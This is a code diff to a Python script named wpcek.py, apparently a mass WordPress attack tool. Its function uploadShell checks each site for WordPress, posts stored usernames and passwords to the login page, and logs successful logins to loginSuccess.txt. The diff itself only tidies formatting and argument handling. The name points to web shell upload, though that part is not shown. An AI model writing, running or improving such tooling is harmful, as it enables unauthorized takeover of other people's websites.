@@ -17,7 +17,7 @@ def uploadShell(site):
         r = requests.Session()
         cek = r.get(site, timeout=10)
         if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
-            login = r.post(site, headers=hd, data={'log':user, 'pwd':pasw}, timeout=10)
+            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
             if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                 print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W, G, W, asuna, G, W))
                 with open('loginSuccess.txt', 'a') as saveLog:
@@ -48,4 +48,7 @@ if __name__ == "__main__":
     if len(sys.argv) != 3:
         print("Usage: python wpcek.py <filename> <thread_count>")
     else:
-        main(sys.argv[1], int(sys.argv[2]))
+        filename = sys.argv[1]
+        thread_count = int(sys.argv[2])
+        print(f"Running wpcek.py with file: {filename} and threads: {thread_count}")
+        main(filename, thread_count)
